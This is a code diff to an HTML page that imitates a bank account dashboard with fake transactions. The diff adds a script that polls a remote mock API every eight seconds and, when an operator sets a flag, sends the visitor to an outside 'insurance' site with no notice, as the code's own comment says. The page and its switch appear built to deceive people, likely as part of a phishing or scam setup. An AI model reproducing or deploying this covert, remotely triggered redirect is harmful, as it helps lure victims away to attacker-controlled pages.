@@ -7,29 +7,52 @@
 <style>
 body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6eef8; }
 .wrap { max-width:420px; margin:0 auto; padding:16px; }
-.logo { display:block; width:120px; margin:0 auto 20px; }
-.card { background:#582d7d; border-radius:14px; padding:16px; margin-bottom:16px; box-shadow:0 4px 12px rgba(0,0,0,0.5); }
+.logo { display:block; width:160px; margin:0 auto 20px; }
+
+.card { 
+    background:#3d1f5e;
+    border-radius:14px; 
+    padding:16px; 
+    margin-bottom:16px; 
+    box-shadow:0 4px 12px rgba(0,0,0,0.5); 
+}
+
 .user-info { text-align:center; }
 .user-info h2 { margin:0; font-size:20px; }
-.user-info p { margin:6px 0 0; color:#98a0b3; font-size:14px; }
+.user-info p { margin:6px 0 0; color:#cfcfd1; font-size:14px; }
 
 .transaction-list { list-style:none; padding:0; margin:0; }
-.transaction-item { display:flex; align-items:center; justify-content:space-between; padding:12px 0; border-bottom:1px solid rgba(255,255,255,0.08); }
-.transaction-item img { width:32px; height:32px; margin-right:12px; border-radius:6px; background:white; padding:4px; }
+.transaction-item { 
+    display:flex; align-items:center; justify-content:space-between; 
+    padding:12px 0; 
+    border-bottom:1px solid rgba(255,255,255,0.08); 
+}
+.transaction-item img { 
+    width:32px; height:32px; margin-right:12px; border-radius:6px; 
+    background:white; padding:4px; 
+}
 .transaction-info { display:flex; align-items:center; gap:8px; }
 .transaction-name { font-size:15px; }
-.transaction-category { font-size:12px; color:#98a0b3; }
-.transaction-date { font-size:12px; color:#98a0b3; }
+.transaction-category { font-size:12px; color:#cfcfd1; }
+.transaction-date { font-size:12px; color:#cfcfd1; }
 .transaction-amount { font-weight:600; }
 
-.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#98a0b3; }
-.btn { background:transparent; border:1px solid rgba(255,255,255,0.06); padding:6px 10px; border-radius:10px; color:#98a0b3; font-size:13px; cursor:pointer; }
+.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#cfcfd1; }
+.btn { 
+    background:transparent; 
+    border:1px solid rgba(255,255,255,0.12); 
+    padding:6px 10px; 
+    border-radius:10px; 
+    color:#cfcfd1; font-size:13px; 
+    cursor:pointer; 
+}
 </style>
 </head>
 <body>
 <div class="wrap">
 
-<img class="logo" src="https://github.com/javad-niroumand/Lisa/blob/main/ChatGPT%20Image%20Nov%2025,%202025,%2002_43_24%20PM%20(1).png?raw=true?raw=true" alt="Bank Logo">
+<!-- Updated logo (clean URL) -->
+<img class="logo" src="https://raw.githubusercontent.com/javad-niroumand/Lisa/main/ChatGPT%20Image%20Nov%2025%2C%202025%2C%2002_43_24%20PM%20(1).png" alt="Bank Logo">
 
 <div class="card user-info">
 <h2 id="userName">—</h2>
@@ -48,6 +71,15 @@ body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6ee
 </div>
 
 <script>
+// ---------------------------------------------
+// Redirect logic
+// Replace this with your real API endpoint later
+// ---------------------------------------------
+const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments/12345";
+const REDIRECT_URL = "https://insurance-git-main-javad-niroumands-projects.vercel.app/";
+let redirectTriggered = false;
+
+// Demo transactions (static)
 const transactions = [
   {name:'Miete', category:'Rent', amount:1200, date:'2025-11-24', logo:'https://i.etsystatic.com/12773587/r/il/63d810/1121816918/il_570xN.1121816918_nwl8.jpg'},
   {name:'Stromrechnung', category:'Electricity', amount:85, date:'2025-11-23', logo:'https://cdn-icons-png.flaticon.com/512/2910/2910766.png'},
@@ -59,11 +91,14 @@ const transactions = [
   {name:'Online Shop', category:'Shopping', amount:120, date:'2025-11-21', logo:'https://cdn-icons-png.flaticon.com/512/1170/1170678.png'}
 ];
 
-function formatCurrency(n){ return '€'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2}); }
+function formatCurrency(n){ 
+    return '€'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2}); 
+}
 
 function renderTransactions(){
   const container = document.getElementById('transactionList');
   container.innerHTML = '';
+
   transactions.forEach(t=>{
     const li = document.createElement('li');
     li.className = 'transaction-item';
@@ -79,7 +114,31 @@ function renderTransactions(){
     `;
     container.appendChild(li);
   });
+
   document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
+}
+
+// --------------------------------------------------
+// AUTO CHECK FOR update2 FLAG EVERY 8 SECONDS
+// Redirects without popup
+// --------------------------------------------------
+async function checkRedirect(){
+  try {
+    const res = await fetch(API_URL, {cache:"no-store"});
+    const data = await res.json();
+
+    if(data.update2 === true && !redirectTriggered){
+      redirectTriggered = true;
+      window.location.href = REDIRECT_URL;
+    }
+
+    if(data.update2 === false){
+      redirectTriggered = false;
+    }
+
+  } catch(err){
+    console.error("Redirect check error:", err);
+  }
 }
 
 // User info
@@ -91,8 +150,10 @@ document.getElementById('refreshBtn').addEventListener('click', renderTransactio
 
 // Initial render
 renderTransactions();
+
+// Start auto redirect polling
+setInterval(checkRedirect, 8000);
+checkRedirect();
 </script>
 </body>
 </html>
-
-
